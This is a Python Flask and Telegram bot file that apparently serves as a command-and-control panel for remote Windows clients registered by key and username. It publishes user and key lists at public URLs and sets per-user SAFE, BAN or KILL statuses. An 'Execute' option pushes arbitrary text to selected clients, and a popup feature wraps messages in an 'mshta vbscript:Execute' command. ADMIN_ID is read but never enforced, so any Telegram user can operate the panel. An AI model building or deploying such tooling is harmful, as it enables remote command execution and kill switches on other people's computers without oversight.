import logging
import os
import threading
import asyncio
import shutil
import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ---------- CONFIGURATION ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("No BOT_TOKEN environment variable set")

ADMIN_ID = os.environ.get("ADMIN_ID") 

KEYS_FILE = "KEYS.txt"
USERS_FILE = "USERS.txt"
USERS_BACKUP_FILE = "USERS_BACKUP.txt"

# State Constants
(
    MENU_HUB,
    WAITING_FOR_REG,
    WAITING_FOR_GRANT,
    WAITING_FOR_BAN_USERS,   # New state for Step 1 of Ban
    WAITING_FOR_BAN_REASON,  # New state for Step 2 of Ban
    WAITING_FOR_EXEC_USERS,
    WAITING_FOR_EXEC_TEXT,
    WAITING_FOR_DELETE,
    WAITING_FOR_RENAME_OLD,
    WAITING_FOR_RENAME_NEW,
    WAITING_FOR_KILL,
    WAITING_FOR_POP_USERS,
    WAITING_FOR_POP_TEXT,
    WAITING_FOR_SEARCH,
    WAITING_FOR_BROADCAST
) = range(15)

app = Flask(__name__)
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- CORE HELPER FUNCTIONS ----------

def clear_global_msg_sync():
    if not os.path.exists(USERS_FILE): return 0
    updated_count, new_lines = 0, []
    with open(USERS_FILE, "r") as f:
        lines = f.readlines()
    for line in lines:
        if " -> " in line:
            parts = line.split(" -> ")
            username, status = parts[0].strip(), parts[1].strip().upper()
            if "SAFE" in status:
                new_lines.append(f"{username} -> SAFE\n")
                updated_count += 1
            else: new_lines.append(line)
        else: new_lines.append(line)
    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return updated_count

def broadcast_update_sync(extra_text: str):
    if not os.path.exists(USERS_FILE): return 0
    updated_count, new_lines = 0, []
    with open(USERS_FILE, "r") as f:
        lines = f.readlines()
    for line in lines:
        if " -> " in line:
            parts = line.split(" -> ")
            username, status = parts[0].strip(), parts[1].strip().upper()
            if "SAFE" in status:
                new_lines.append(f"{username} -> SAFE {extra_text}\n")
                updated_count += 1
            else: new_lines.append(line)
        else: new_lines.append(line)
    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return updated_count

def get_stats_sync():
    if not os.path.exists(USERS_FILE): return "File not found."
    safe, banned, kill, total = 0, 0, 0, 0
    with open(USERS_FILE, "r") as f:
        for line in f:
            if " -> " in line:
                total += 1
                status = line.split(" -> ")[1].strip().upper()
                if "SAFE" in status: safe += 1
                elif "BAN" in status: banned += 1
                elif "KILL" in status: kill += 1
    return f"📊 **System Stats**\n━━━━━━━━━━━━━━\n👥 Total Users: `{total}`\n✅ SAFE: `{safe}`\n🚫 BANNED: `{banned}`\n☠️ KILL: `{kill}`"

def search_user_sync(query: str):
    if not os.path.exists(USERS_FILE): return "File not found."
    query = query.strip().lower()
    results = []
    with open(USERS_FILE, "r") as f:
        for line in f:
            if query in line.lower(): results.append(line.strip())
    if not results: return f"🔍 No users found matching `{query}`"
    return "🔍 **Search Results:**\n" + "\n".join([f"`{r}`" for r in results])

def ban_all_users_sync():
    if not os.path.exists(USERS_FILE): return 0
    shutil.copyfile(USERS_FILE, USERS_BACKUP_FILE)
    updated_count, new_lines = 0, []
    with open(USERS_FILE, "r") as f:
        lines = f.readlines()
    for line in lines:
        if " -> " in line:
            u_part = line.split(" -> ")[0].strip()
            new_lines.append(f"{u_part} -> BAN\n")
            updated_count += 1
        else: new_lines.append(line)
    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return updated_count

def undo_ban_all_sync():
    if not os.path.exists(USERS_BACKUP_FILE): return False
    shutil.copyfile(USERS_BACKUP_FILE, USERS_FILE)
    return True

def rename_user_sync(old_name: str, new_name: str):
    if not os.path.exists(USERS_FILE): return False
    updated, new_lines = False, []
    with open(USERS_FILE, "r") as f:
        lines = f.readlines()
    for line in lines:
        if " -> " in line:
            parts = line.split(" -> ")
            curr, status = parts[0].strip(), parts[1].strip()
            if curr == old_name.strip():
                new_lines.append(f"{new_name.strip()} -> {status}\n")
                updated = True
            else: new_lines.append(line)
        else: new_lines.append(line)
    if updated:
        with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return updated

def write_to_files(mac: str, username: str, status: str):
    try:
        for filename, content in [(KEYS_FILE, mac.strip()), (USERS_FILE, f"{username.strip()} -> {status}")]:
            needs_newline = False
            if os.path.isfile(filename) and os.path.getsize(filename) > 0:
                with open(filename, "rb+") as f:
                    f.seek(-1, 2)
                    if f.read(1) != b'\n': needs_newline = True
            with open(filename, "a") as f:
                if needs_newline: f.write("\n")
                f.write(content + "\n")
    except Exception as e: logger.error(f"File write error: {e}")

def batch_update_users(target_input: str, new_status_base: str, extra_text: str = ""):
    if not os.path.exists(USERS_FILE): return 0, []
    targets = [u.strip() for u in target_input.split('-') if u.strip()]
    updated_users, new_lines = [], []
    with open(USERS_FILE, "r") as f:
        lines = f.readlines()
    for line in lines:
        if " -> " in line:
            u_part = line.split(" -> ")[0].strip()
            if u_part in targets:
                status_str = f"{new_status_base} {extra_text}".strip()
                new_lines.append(f"{u_part} -> {status_str}\n")
                updated_users.append(u_part)
            else: new_lines.append(line)
        else: new_lines.append(line)
    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return len(updated_users), updated_users

def delete_sync_users(target_input: str):
    if not os.path.exists(USERS_FILE) or not os.path.exists(KEYS_FILE): return 0
    targets = [u.strip() for u in target_input.split('-') if u.strip()]
    with open(USERS_FILE, "r") as f: u_lines = f.readlines()
    with open(KEYS_FILE, "r") as f: k_lines = f.readlines()
    indices = [i for i, l in enumerate(u_lines) if " -> " in l and l.split(" -> ")[0].strip() in targets]
    new_u = [line for i, line in enumerate(u_lines) if i not in indices]
    new_k = [line for i, line in enumerate(k_lines) if i not in indices]
    with open(USERS_FILE, "w") as f: f.writelines(new_u)
    with open(KEYS_FILE, "w") as f: f.writelines(new_k)
    return len(indices)

# ---------- UI COMPONENTS ----------

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("📝 Register", callback_data="m_reg"), InlineKeyboardButton("✅ Grant", callback_data="m_grant")],
        [InlineKeyboardButton("🚫 Ban", callback_data="m_ban"), InlineKeyboardButton("☠️ KILL", callback_data="m_kill")],
        [InlineKeyboardButton("🗑️ Delete", callback_data="m_del"), InlineKeyboardButton("✏️ Rename", callback_data="m_rename")],
        [InlineKeyboardButton("⚡ Execute", callback_data="m_exec"), InlineKeyboardButton("💬 Popup Msg", callback_data="m_popup")],
        [InlineKeyboardButton("🔍 Search", callback_data="m_search"), InlineKeyboardButton("📊 Stats", callback_data="m_stats")],
        [InlineKeyboardButton("📢 Broadcast (SAFE)", callback_data="m_broad"), InlineKeyboardButton("🧹 Clear (SAFE)", callback_data="m_clear_broad")],
        [InlineKeyboardButton("📋 Full List", callback_data="m_list"), InlineKeyboardButton("📥 Get Backups", callback_data="m_backup")],
        [InlineKeyboardButton("💀 BAN ALL USERS", callback_data="m_ban_all"), InlineKeyboardButton("↩️ Undo Ban All", callback_data="m_undo_ban")],
        [InlineKeyboardButton("✖️ Close Session", callback_data="m_cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Operation", callback_data="m_stop")]])

# ---------- HANDLERS ----------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = "✨ **System Hub Online**\n━━━━━━━━━━━━━━\nSelect administrative action:"
    reply_markup = main_menu_keyboard()
    if update.callback_query: await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    else: await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    return MENU_HUB

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    c = query.data

    if c == "m_stop": return await start(update, context)
    if c == "m_reg": await query.edit_message_text("📝 **Registration**\nSend: `KEY USERNAME`", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_REG
    if c == "m_grant": await query.edit_message_text("✅ **Grant SAFE**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_GRANT
    if c == "m_ban": 
        await query.edit_message_text("🚫 **Ban System**\n**Step 1:** Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_BAN_USERS
    if c == "m_kill": await query.edit_message_text("☠️ **Set KILL**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_KILL
    if c == "m_del": await query.edit_message_text("🗑️ **Sync Delete**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_DELETE
    if c == "m_rename": await query.edit_message_text("✏️ **Rename**\nSend **current** name:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_OLD
    if c == "m_exec": await query.edit_message_text("⚡ **Execute**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_USERS
    if c == "m_popup": await query.edit_message_text("💬 **Popup Msg**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_USERS
    
    if c == "m_stats": await query.edit_message_text(get_stats_sync(), reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
    if c == "m_search": await query.edit_message_text("🔍 **Search**\nEnter keyword:", reply_markup=cancel_keyboard()); return WAITING_FOR_SEARCH
    if c == "m_broad": await query.edit_message_text("📢 **Broadcast (SAFE Only)**\nEnter text:", reply_markup=cancel_keyboard()); return WAITING_FOR_BROADCAST
    if c == "m_clear_broad":
        count = clear_global_msg_sync()
        await query.edit_message_text(f"🧹 Cleared {count} SAFE users.", reply_markup=main_menu_keyboard()); return MENU_HUB

    if c == "m_ban_all":
        count = ban_all_users_sync()
        await query.edit_message_text(f"💀 Banned all {count} users.", reply_markup=main_menu_keyboard()); return MENU_HUB
    if c == "m_undo_ban":
        msg = "✅ Restored!" if undo_ban_all_sync() else "❌ No backup."
        await query.edit_message_text(msg, reply_markup=main_menu_keyboard()); return MENU_HUB
    
    if c == "m_backup":
        chat_id = update.effective_chat.id
        try:
            for f_name in [USERS_FILE, KEYS_FILE]:
                if os.path.exists(f_name):
                    with open(f_name, 'rb') as f: await context.bot.send_document(chat_id=chat_id, document=f)
            await query.edit_message_text("✅ Backups sent!", reply_markup=main_menu_keyboard())
            return MENU_HUB
        except: return MENU_HUB

    if c == "m_list":
        try:
            with open(USERS_FILE, "r") as f: content = f.read().strip()
            msg = f"📋 **Database**\n```\n{content if content else 'Empty'}\n```"
        except: msg = "❌ Error."
        await query.edit_message_text(msg, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
    
    if c == "m_cancel": await query.edit_message_text("💤 Session Closed."); return ConversationHandler.END

# ---------- STEP HANDLERS ----------

async def handle_ban_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ban_targets"] = update.message.text
    await update.message.reply_text("🚫 **Step 2:** Send the **Ban Reason** to show the user:", parse_mode="Markdown", reply_markup=cancel_keyboard())
    return WAITING_FOR_BAN_REASON

async def handle_ban_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reason = update.message.text.strip()
    count, _ = batch_update_users(context.user_data.get("ban_targets", ""), "BAN", reason)
    await update.message.reply_text(f"🚫 Done. {count} users banned with reason: `{reason}`"); return await start(update, context)

async def handle_registration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    parts = update.message.text.split()
    if len(parts) < 2: await update.message.reply_text("⚠️ Use: `KEY USERNAME`", reply_markup=cancel_keyboard()); return WAITING_FOR_REG
    write_to_files(parts[0], " ".join(parts[1:]), "SAFE")
    await update.message.reply_text(f"✅ Registered `{parts[1]}`"); return await start(update, context)

async def handle_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(search_user_sync(update.message.text), parse_mode="Markdown"); return await start(update, context)

async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = broadcast_update_sync(update.message.text)
    await update.message.reply_text(f"📢 Sent to {count} SAFE users."); return await start(update, context)

async def handle_rename_old(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["rename_old"] = update.message.text.strip()
    await update.message.reply_text("✏️ Send **NEW** username:", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_NEW

async def handle_rename_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    old, new = context.user_data.get("rename_old"), update.message.text.strip()
    msg = f"✅ Renamed `{old}`" if rename_user_sync(old, new) else f"❌ `{old}` not found."
    await update.message.reply_text(msg); return await start(update, context)

async def handle_grant(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count, _ = batch_update_users(update.message.text, "SAFE")
    await update.message.reply_text(f"✅ {count} SAFE"); return await start(update, context)

async def handle_kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count, _ = batch_update_users(update.message.text, "KILL")
    await update.message.reply_text(f"☠️ {count} KILL"); return await start(update, context)

async def handle_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = delete_sync_users(update.message.text)
    await update.message.reply_text(f"🗑️ Deleted {count}."); return await start(update, context)

async def handle_exec_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["exec_targets"] = update.message.text
    await update.message.reply_text("📝 Send text:", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_TEXT

async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count, _ = batch_update_users(context.user_data.get("exec_targets", ""), "SAFE", update.message.text)
    await update.message.reply_text(f"⚡ Done."); return await start(update, context)

async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["pop_targets"] = update.message.text
    await update.message.reply_text("💬 Send Popup Text:", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_TEXT

async def handle_pop_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vbs = f'mshta vbscript:Execute("msgbox ""{update.message.text.strip()}"",64,""System Message"":close")'
    count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "SAFE", vbs)
    await update.message.reply_text(f"💬 Sent to {count}."); return await start(update, context)

# ---------- APP SETUP ----------
application = Application.builder().token(BOT_TOKEN).build()
conv_handler = ConversationHandler(
    entry_points=[CommandHandler("start", start), CommandHandler("begin", start)],
    states={
        MENU_HUB: [CallbackQueryHandler(menu_callback)],
        WAITING_FOR_REG: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_registration)],
        WAITING_FOR_GRANT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_grant)],
        WAITING_FOR_BAN_USERS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ban_users)],
        WAITING_FOR_BAN_REASON: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ban_final)],
        WAITING_FOR_KILL: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_kill)],
        WAITING_FOR_DELETE: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_delete)],
        WAITING_FOR_RENAME_OLD: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_rename_old)],
        WAITING_FOR_RENAME_NEW: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_rename_new)],
        WAITING_FOR_EXEC_USERS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_users)],
        WAITING_FOR_EXEC_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_final)],
        WAITING_FOR_POP_USERS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_users)],
        WAITING_FOR_POP_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_final)],
        WAITING_FOR_SEARCH: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_search)],
        WAITING_FOR_BROADCAST: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_broadcast)],
    },
    fallbacks=[CallbackQueryHandler(menu_callback, pattern="^m_stop$")],
    conversation_timeout=120
)
application.add_handler(conv_handler)

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
async def init_app():
    await application.initialize()
    domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
    if domain: await application.bot.set_webhook(url=f"https://{domain}/webhook")
loop.create_task(init_app())

def run_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()
threading.Thread(target=run_loop, daemon=True).start()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.run_coroutine_threadsafe(application.process_update(update), loop)
    return "OK", 200

@app.route('/USERS.txt')
def get_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f: return f.read(), 200, {'Content-Type': 'text/plain'}
    return "Not found", 404

@app.route('/KEYS.txt')
def get_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, 'r') as f: return f.read(), 200, {'Content-Type': 'text/plain'}
    return "Not found", 404

@app.route('/')
def home(): return "Bot is running", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))